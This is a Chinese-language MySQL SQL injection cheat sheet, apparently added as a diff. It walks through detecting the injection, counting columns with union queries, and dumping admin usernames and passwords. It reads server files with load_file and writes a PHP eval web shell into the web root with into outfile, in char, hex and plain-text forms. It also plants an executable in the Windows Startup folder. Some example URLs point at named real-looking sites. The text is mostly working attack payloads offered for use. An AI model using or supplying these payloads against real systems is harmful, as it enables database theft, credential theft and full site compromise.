@@ -1,0 +1,103 @@
+1.判断是否存在注入,加';and 1=1;and 1=2
+2.判断版本 and ord(mid(version(),1,1))>51 /* 返回正常说明是4.0以上版本，可以用union查询
+3.利用order by 暴字段，在网址后加 order by 10 /* 如果返回正常说明字段大于10
+4.再利用union来查询准确字段，如: and 1=2 union select 1,2,3,......./*直到返回正常，说明猜到准确字段数。如过滤了空格可以用/**/代替。
+5.判断数据库连接帐号有没有写权限，and (select count(*) from mysql.user)>0 /*如果结果返回错误，那我们只能猜解管理员帐号和密码了。
+6.如果返回正常，则可以通过and 1=2 union select 1,2,3,4,5,6,load_file(char(文件路径的ascii值，用逗号隔开)),8,9,10 /* 注：load_file(char(文件路径的ascii值，用逗号隔开))也可以用十六进制，通过这种方式读取配置文件，找到数据库连接等。
+7.首先猜解user表,如: and 1=2 union select 1,2,3,4,5,6.... from user /* 如果返回正常，说明存在这个表。
+8.知道了表就猜解字段,and 1=2 union select 1,username,3,4,5,6.... from user/*如果在2字段显示出字段内容则存在些字段。
+9.同理再猜解password字段,猜解成功再找后台登录。
+10.登录后台，上传shell。 
+11.检测是不是root权限 and/**/ord(mid(user(),1,1))=114/*
+
+PHP注入小技巧:
+
+unhex(hex(user()))  unhex把16进制进行转换  hex是16进制
+
+编码不同的问题，hex()搞不定的话试试convert()函数
+
+boardrule.php?groupboardid=11111/**/union/**/select/**/concat(user(),0x3f,database(),0x3f,version())/*
+
+id=133 and 1=2 union select 1,2,<?php eval($_POST['#']);?>,4,5 into outfile '/home/www/htdocs/shell.php'/*
+
+http://site.com/article.php?id=-1+union+all+select+null,null,concat_ws(0x7,username,password) from tbluser/*
+
+
+http://www.bitdefenderthailand.com/products.php?id=-1+union+all+select+1,unhex(hex(concat_ws(char(58),login,passwd))),3,4,5,6,7,8,9+ from+mas_member/*
+
+
+如果可以联合查询，但是没有任何字段值显示到页面上的话，就只能采用盲注入的方式一个一个把值暴出来（国外的mysqlbf.pl和mysqlget.exe等等都可以轻松地做到）。
+
+
+union select 1,2,3,password,user,6,7,8,9,10,11,12 from mysql.user/* 跑user表
+
+这里首先列出几个常用的涵数:1:system_user()2:user()3:current_user4:session_user()5:database()6:version()7:load_file()......他们的含义分别如下:
+
+1:系统用户名.2:用户名.3:当前用户名:4连接数据库的用户名.5:数据库名.6:数据库版本.7:MYSQL读取本地文件的函数
+
+
+
+只要把load_file()放到页面出现的字段上,最好保证有足够位置能显示完你要显示的文件.实在没有足够位置也不紧张,下面我再教你几招.
+
+1:有时候,你明明确认自己拥有读和写文件的权利,却硬是读不出来文件,或者一片空白.为什么?原因可能是对方的系统在权限配置上做的好,你的USER权限,读不到他ADMINISTRATOR里的文件.NTFS和LINUX都能做到这点.如果你排除以上情况,你就要考虑,是不是你读出来的内容,被浏览器当作HTML,ASP,PHP,ASPX,JSP等等的脚本语言给执行了?譬如你读出来的内容如果含有<>等符号,那么浏览器就会执行你的文件内容,你自然什么都看不到.对付这样的情况,也很简单,我们只要把那些特殊的符号,在读出来的时候,用别的符号去代替他们,这样浏览器就不会去执行他们了!怎么代替?我们有replace(load_file(A),char(B),char(C))函数在!当你读A文件出来的时候,如果里面有B字母或者符号,那么MYSQL会用C字母或者符号去代替B,然后再显示出来.OK.我们这么一换上:replace(load_file(A)),char(60),char(32)).这里一样用的CHAR()函数转换为字母即一旦出现"<"符号,就用空格来代替他.这样就能完整的回显内容给你了.
+
+例如:http://www.tian6.com/page.php?fp=newsdetail&id=1885%
+
+20and%201=2%20union%20select%201,replace(load_file(char
+
+(68,58,92,97,104,99,98,120,121,92,119,101,98,92,105,110,100,101,120,46,112,104,112)),char(60),char
+
+(32)),3,4,5,6,7,user()/*
+
+
+2:所有的字段位置都不够位置回显,读到的文件不完整哦,又不是上面的原因,那么怎么办呢?这里我们用Substring(str,pos,len)函数解决问题.他的意思是从字符串str的pos位位置起返回len个字符的子串.譬如Substring(load_file(A),50,100)就是把A的内容的第50个字母开始回显100个给你.那么就能逐段逐段的回显啦.
+
+
+
+into outfile的高级运用!
+OK.load_file()我们就说那么多了.接下来,我们还有许多的重头戏要来呢!这里,我要说下一个很重要的运用方法,也正是我着重参考剑心几部作品的技术的部分.当我们确定如下几个条件以后:
+1获得物理路径(into outfile '物理路径') 这样才能写对目录
+2能够使用union (也就是说需要MYSQL3以上的版本)
+3对方没有对’进行过滤(因为outfile 后面的 '' 不可以用其他函数代替转换)
+4就是MYSQL用户拥有file_priv权限(不然就不能写文件 或者把文件内容读出)
+5对web目录有写权限MS的系统一般都有权限,但是LINUX通常都是rwxr-xr-x 也就是说组跟其他用户都没有权限写操作.
+
+这里的1,我们一般可以靠数据库出错信息来爆出来,不行的话,也可以通过load_file()来得到.2那是一般都可以的了...3也不多见对'''过滤的.4有没有权限,我们前面已经测试过的了.5如果不能备份到网站的路径上来,我们也还有别的办法,譬如到starup,run里面去等等社工的办法.而且一般多试试上传目录,图片目录,还是大部分都有读写权限的.
+OK.需要的条件确定了,那怎么用呢?我们分开两部来说用法.
+
+用法1:这是中规中矩的用法,大家都知道.就是采用网站有的留言,上传等功能,把你的一句话马弄上去,然后使用
+
+[Copy to clipboard] [ - ]CODE:
+http://www.tian6.com/coder.php?id=1 and 1=2 union select 1,load_file( /www/home/html/upload/qingyafengping.jpg),3,4,5,6 into outfile '/www/home/html/coder.php'/*   你的小马就诞生了.
+其中/www/home/html/upload/qingyafengping.jpg为你已上传的木马地址.3,4,5,6为假设存在字段,/www/home/html/为假设的WEB路径.
+
+
+用法2,也是重点要说的.上面的方法,局限性还是比较大的,如果网站不给你上传,或者网站过滤上传的内容,那怎么办?不用怕,剑心早在几年前就给我们想到了个好办法.我们只需要直接这么执行URL:
+
+[Copy to clipboard] [ - ]CODE:
+http://www.tiany6.com/coder.php?id=1 and 1=2 union select 1,char(这里是你的马的代码,记得转为10进或者16进),3,4,5,6 into outfile '/www/home/html/coder.php'/*   这样你的小马也诞生了,不需要上传,也不怕他过滤.
+譬如
+
+[Copy to clipboard] [ - ]CODE:
+http://www.tiany6.com/coder.php?id=1 and 1=2 union select 1,char(60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,99,109,100,93,41,63,62),3,4,5,6 into outfile '/www/home/html/coder.php'/*
+或者
+[url]http://www.tiany6.com/coder.php?id=1[/url] and 1=2 union select 1,0x3C3F706870206576616C28245F504F53545B636D645D293F3E,3,4,5,6 into outfile '/www/home/html/coder.php'/*
+或者
+[url]http://www.tiany6.com/coder.php?id=1[/url] and 1=2 union select 1,'<?php eval($_POST[cmd])?>',3,4,5,6 into outfile '/www/home/html/coder.php'/*
+3,4,5,6为假设存在字段,/www/home/html/为假设的WEB路径.
+
+
+%2527就是星点 %
+看到这个$idx=urldecode($_REQUEST['idx']);猪点没有,可以into outfile %2527D:\new90oo\xhmgg.php%2527/*导出文件!
+
+
+用 load data infile 读取文件，命令如下 
+
+mysql>create table a (cmd text); 
+mysql>load data infile 'c:\\boot.ini' into table a; 
+mysql>select * from a; 
+
+注入中的语法（未测试） 
+
+
+id=xxx and 1=2 union select 1,2,3,unhex(mm.exe的十六进制),5 INTO DUMPFILE 'C:\\Documents and Settings\\All Users\\「开始」菜单\程序\启动\\mm.exe'/* 
